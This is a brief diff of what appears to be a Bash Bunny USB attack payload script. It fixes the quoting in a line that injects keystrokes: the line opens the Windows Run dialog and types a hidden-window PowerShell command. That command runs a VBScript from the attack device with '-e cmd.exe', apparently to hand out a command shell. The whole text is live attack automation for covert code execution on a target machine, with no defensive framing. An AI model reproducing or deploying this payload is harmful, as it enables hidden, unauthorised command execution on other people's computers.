@@ -37,7 +37,7 @@ LED ATTACK
 # Run the VBScript
 QUACK GUI r
 QUACK DELAY 100
-QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')" -e cmd.exe
+QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs') -e cmd.exe"
 QUACK ENTER
 
 
